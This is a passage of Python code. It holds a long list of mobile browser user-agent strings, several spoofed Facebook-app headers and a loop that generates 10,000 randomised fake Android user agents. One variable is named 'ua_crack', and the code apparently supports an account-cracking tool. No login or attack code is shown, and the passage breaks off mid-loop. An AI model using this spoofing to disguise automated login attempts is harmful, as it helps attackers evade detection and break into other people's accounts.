'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-ID; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-ID; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-IDN; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-IDN; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BD; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BD; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BGD; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BGD; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PK; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PK; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PAK; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PAK; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IN; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IN; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IND; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IND; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SA; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SA; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SAU; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SAU; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-US; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; id-ID; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; id-ID; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; id-ID; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; enus; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-us; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36']
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
ugen=[]
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1803 Build/NMF26F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/83.0.4103.96 Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1803 Build/OPM1.171019.026; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2159)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/MMB29M; AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Nexus 6P Build/MMB29P)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	
	aa='ua_crack = ["Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX2185)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/104.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
